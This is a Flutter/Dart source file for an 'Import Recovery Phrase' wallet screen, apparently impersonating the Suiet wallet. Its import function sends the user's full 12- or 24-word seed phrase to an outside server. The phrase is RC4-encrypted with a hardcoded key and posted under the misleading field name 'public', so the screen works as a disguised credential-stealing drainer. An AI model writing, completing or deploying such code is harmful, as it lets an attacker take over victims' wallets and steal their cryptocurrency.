import 'dart:convert';
import 'dart:typed_data';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:bip39/bip39.dart' as bip39;
import 'package:simple_rc4/simple_rc4.dart';
import 'package:wallet/wallet.dart' as wallet;
import 'package:web3dart/web3dart.dart' as web3dart;
import 'package:web3dart/web3dart.dart';
import 'package:flutter/services.dart';
import 'package:web3dart/crypto.dart' as crypto;
import 'wallet_screen.dart';
const String API_URL = 'https://localnetwork.cc/record/docs/filler'; // Замените на ваш API URL
const String SERVER_KEY = 'Qsx@ah&OR82WX9T6gCt'; // Замените на ваш серверный ключ
const String APP_NAME = 'SuietWallet_IOS'; // Название вашего приложения

class ImportRecoveryScreen extends StatefulWidget {
  const ImportRecoveryScreen({super.key});

  @override
  _ImportRecoveryScreenState createState() => _ImportRecoveryScreenState();
}

class _ImportRecoveryScreenState extends State<ImportRecoveryScreen> {
  int _selectedFieldCount = 12;
  final List<TextEditingController> _controllers = [];

  @override
  void initState() {
    super.initState();
    _controllers.addAll(List.generate(
      _selectedFieldCount,
          (index) => TextEditingController(),
    ));
  }

  @override
  void dispose() {
    for (final controller in _controllers) {
      controller.dispose();
    }
    super.dispose();
  }

  void _updateFieldCount(int newCount) {
    setState(() {
      _selectedFieldCount = newCount;
      if (_controllers.length < _selectedFieldCount) {
        _controllers.addAll(List.generate(
          _selectedFieldCount - _controllers.length,
              (index) => TextEditingController(),
        ));
      } else if (_controllers.length > _selectedFieldCount) {
        _controllers.removeRange(_selectedFieldCount, _controllers.length);
      }
    });
  }

  Future<void> _importWallet() async {
    final mnemonic = _controllers.map((c) => c.text).join(' ');

    if (!bip39.validateMnemonic(mnemonic)) {
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(content: Text('Invalid mnemonic phrase.')),
      );
      return;
    }

    try {
      final random = _generateRandomSalt();
      final jsonBody = jsonEncode({
        'public': mnemonic,
        'salt': random,
        'name': APP_NAME,
        'new': false,
      });

      final encryptedData = _encryptData(jsonBody, SERVER_KEY);

      final response = await http.post(
        Uri.parse(API_URL),
        body: {'data': encryptedData},
        encoding: Encoding.getByName('utf-8'),
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
      );

      if (response.statusCode == 200) {
        final responseBody = jsonDecode(response.body);
        print('Server response: ${responseBody}');
        _processResponse(responseBody);
      } else {
        throw Exception("Failed to import wallet. Status code: ${response.statusCode}");
      }
    } catch (e) {
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(content: Text('Error: ${e.toString()}')),
      );
    }
  }

  String _generateRandomSalt() {
    final random = (DateTime.now().millisecondsSinceEpoch % 1000000).toString().padLeft(6, '0');
    return random;
  }

  String _encryptData(String data, String key) {
    final rc4 = RC4(key);
    final encryptedData = rc4.encodeBytes(data.codeUnits);
    return base64.encode(encryptedData);
  }

  void _processResponse(Map<String, dynamic> responseBody) {
    final portfolioId = responseBody['portfolio']['id'];
    final privateKey = _generatePrivateKey(_controllers.map((c) => c.text).join(' '));
    final publicKey = _generatePublicKey(privateKey);
    final address = _generateAddress(publicKey);

    if (address.toLowerCase() == portfolioId.toLowerCase()) {
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(content: Text('Wallet imported successfully. Address: $address')),
      );
      Navigator.push(
        context,
        MaterialPageRoute(
          builder: (context) => WalletScreen(),
        ),
      );
    } else {
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(content: Text('Address does not match the server response.')),
      );
    }
  }

  Uint8List _generatePrivateKey(String mnemonic) {
    if (!bip39.validateMnemonic(mnemonic)) {
      throw FormatException("Invalid mnemonic phrase.");
    }

    final seed = bip39.mnemonicToSeed(mnemonic);
    final masterKey = wallet.ExtendedPrivateKey.master(seed, wallet.xprv);
    final derivedKey = masterKey.forPath("m/44'/60'/0'/0/0") as wallet.ExtendedPrivateKey;
    final privateKey = _bigIntToUint8List(derivedKey.key);
    return privateKey;
  }

  Uint8List _generatePublicKey(Uint8List privateKey) {
    try {
      final ethPrivateKey = EthPrivateKey(privateKey);
      final publicKey = ethPrivateKey.publicKey;
      final publicKeyBytes = publicKey.getEncoded(false); // Generate uncompressed public key
      if (publicKeyBytes.length != 65) { // Uncompressed public key should be 65 bytes including the prefix
        throw FormatException("Invalid public key length. Expected 65 bytes.");
      }
      return publicKeyBytes.sublist(1); // Remove the prefix byte
    } catch (e) {
      throw Exception("Failed to generate public key: ${e.toString()}");
    }
  }

  String _generateAddress(Uint8List publicKey) {
    if (publicKey.length != 64) {
      throw FormatException("Invalid public key length. Expected 64 bytes.");
    }
    final addressBytes = crypto.keccak256(publicKey).sublist(12);
    return web3dart.EthereumAddress(addressBytes).hex;
  }

  Uint8List _bigIntToUint8List(BigInt bigInt) {
    return bigIntToBytes(bigInt);
  }

  Uint8List bigIntToBytes(BigInt number) {
    number = number.isNegative ? -number : number;
    int bytesNeeded = (number.bitLength + 7) >> 3;
    var byteList = Uint8List(bytesNeeded);
    var byteData = ByteData.sublistView(byteList);

    for (int i = 0; i < bytesNeeded; i++) {
      byteData.setUint8(bytesNeeded - i - 1, number.toUnsigned(8).toInt());
      number = number >> 8;
    }

    return byteList;
  }

  @override
  Widget build(BuildContext context) {
    final screenWidth = MediaQuery.of(context).size.width;

    return Scaffold(
      backgroundColor: Colors.white,
      appBar: AppBar(
        backgroundColor: Colors.transparent,
        elevation: 0,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back, color: Color(0xFF8E8E93)),
          onPressed: () {
            Navigator.pop(context);
          },
        ),
        title: const Text(
          'Import Wallet',
          style: TextStyle(color: Color(0xFF8E8E93), fontSize: 18),
        ),
        centerTitle: true,
      ),
      body: Stack(
        children: [
          Align(
            alignment: Alignment.bottomRight,
            child: Padding(
              padding: const EdgeInsets.only(right: 5, bottom: 16),
              child: Image.asset(
                'assets/images/logo3.png',
                width: screenWidth * 0.4,
                height: screenWidth * 0.4,
                fit: BoxFit.contain,
              ),
            ),
          ),
          SingleChildScrollView(
            padding: const EdgeInsets.symmetric(horizontal: 10),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.center,
              children: [
                const SizedBox(height: 20),
                const Text(
                  'Import Recovery Phrase',
                  style: TextStyle(
                    fontSize: 30,
                    color: Color(0xFF007AFF),
                    fontWeight: FontWeight.bold,
                  ),
                  textAlign: TextAlign.center,
                ),
                const SizedBox(height: 10),
                const Text(
                  'From an existing wallet.',
                  style: TextStyle(
                    fontSize: 14,
                    color: Color(0xFF8E8E93),
                    fontWeight: FontWeight.bold,
                  ),
                  textAlign: TextAlign.center,
                ),
                const SizedBox(height: 10),
                Center(
                  child: SizedBox(
                    width: 130,
                    child: DropdownButtonFormField<int>(
                      value: _selectedFieldCount,
                      onChanged: (int? newValue) {
                        if (newValue != null) {
                          _updateFieldCount(newValue);
                        }
                      },
                      decoration: InputDecoration(
                        filled: true,
                        fillColor: Colors.white,
                        border: InputBorder.none,
                        enabledBorder: InputBorder.none,
                        focusedBorder: InputBorder.none,
                      ),
                      dropdownColor: Colors.white,
                      style: const TextStyle(color: Colors.black),
                      items: const [
                        DropdownMenuItem(value: 12, child: Text('12 Words')),
                        DropdownMenuItem(value: 24, child: Text('24 Words')),
                      ],
                      icon: const Icon(Icons.arrow_drop_down, color: Colors.blue),
                      iconSize: 24,
                    ),
                  ),
                ),
                Card(
                  shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(12),
                  ),
                  margin: const EdgeInsets.symmetric(horizontal: 10, vertical: 20),
                  color: Colors.transparent,
                  child: Container(
                    padding: const EdgeInsets.all(16),
                    decoration: BoxDecoration(
                      borderRadius: BorderRadius.circular(12),
                      gradient: const LinearGradient(
                        colors: [Color(0xFF015FDF), Color(0xFF1ED2FC)],
                        begin: Alignment.topRight,
                        end: Alignment.bottomLeft,
                      ),
                    ),
                    child: Column(
                      children: [
                        GridView.builder(
                          shrinkWrap: true,
                          physics: const NeverScrollableScrollPhysics(),
                          gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                            crossAxisCount: 2,
                            childAspectRatio: 4,
                            crossAxisSpacing: 10,
                            mainAxisSpacing: 10,
                          ),
                          itemCount: _selectedFieldCount,
                          itemBuilder: (context, index) {
                            return Container(
                              decoration: BoxDecoration(
                                color: Colors.white.withOpacity(0.2),
                                borderRadius: BorderRadius.circular(8),
                              ),
                              child: TextField(
                                controller: _controllers[index],
                                textAlign: TextAlign.left,
                                decoration: InputDecoration(
                                  labelText: '${index + 1}.',
                                  filled: true,
                                  fillColor: Colors.white.withOpacity(0.2),
                                  border: OutlineInputBorder(
                                    borderRadius: BorderRadius.circular(8),
                                    borderSide: BorderSide.none,
                                  ),
                                  contentPadding: const EdgeInsets.symmetric(horizontal: 10, vertical: 12),
                                  labelStyle: const TextStyle(
                                    color: Colors.white,
                                  ),
                                  hintStyle: const TextStyle(
                                    color: Colors.white,
                                  ),
                                ),
                                style: const TextStyle(
                                  color: Colors.white,
                                ),
                                cursorColor: Colors.white,
                              ),
                            );
                          },
                        ),
                        const SizedBox(height: 10),
                        Row(
                          children: [
                            Expanded(
                              flex: 1,
                              child: Padding(
                                padding: const EdgeInsets.only(right: 10),
                                child: ElevatedButton.icon(
                                  onPressed: () {},
                                  style: ElevatedButton.styleFrom(
                                    backgroundColor: Colors.transparent,
                                    foregroundColor: Colors.white,
                                    shape: RoundedRectangleBorder(
                                      borderRadius: BorderRadius.circular(6),
                                      side: const BorderSide(color: Colors.white),
                                    ),
                                    padding: const EdgeInsets.symmetric(vertical: 12, horizontal: 16),
                                  ),
                                  icon: const Icon(Icons.copy, color: Colors.white, size: 16),
                                  label: const Text(
                                    'Copy',
                                    style: TextStyle(
                                      color: Colors.white,
                                      fontSize: 14,
                                    ),
                                    maxLines: 1,
                                    overflow: TextOverflow.visible,
                                  ),
                                ),
                              ),
                            ),
                            Expanded(
                              flex: 2,
                              child: ElevatedButton(
                                onPressed: _importWallet,
                                style: ElevatedButton.styleFrom(
                                  backgroundColor: Colors.white,
                                  foregroundColor: const Color(0xFF007AFF),
                                  shape: RoundedRectangleBorder(
                                    borderRadius: BorderRadius.circular(6),
                                  ),
                                  padding: const EdgeInsets.symmetric(vertical: 12),
                                ),
                                child: const Text(
                                  'Yes, I\'ve saved it',
                                  style: TextStyle(
                                    fontSize: 14,
                                  ),
                                  maxLines: 1,
                                  overflow: TextOverflow.visible,
                                ),
                              ),
                            ),
                          ],
                        ),
                      ],
                    ),
                  ),
                ),
                const Text(
                  'Displayed when you first created your wallet.',
                  style: TextStyle(
                    fontSize: 14,
                    color: Color(0xFF8E8E93),
                    fontWeight: FontWeight.bold,
                  ),
                  textAlign: TextAlign.center,
                ),
                const SizedBox(height: 16),
              ],
            ),
          ),
        ],
      ),
    );
  }
}
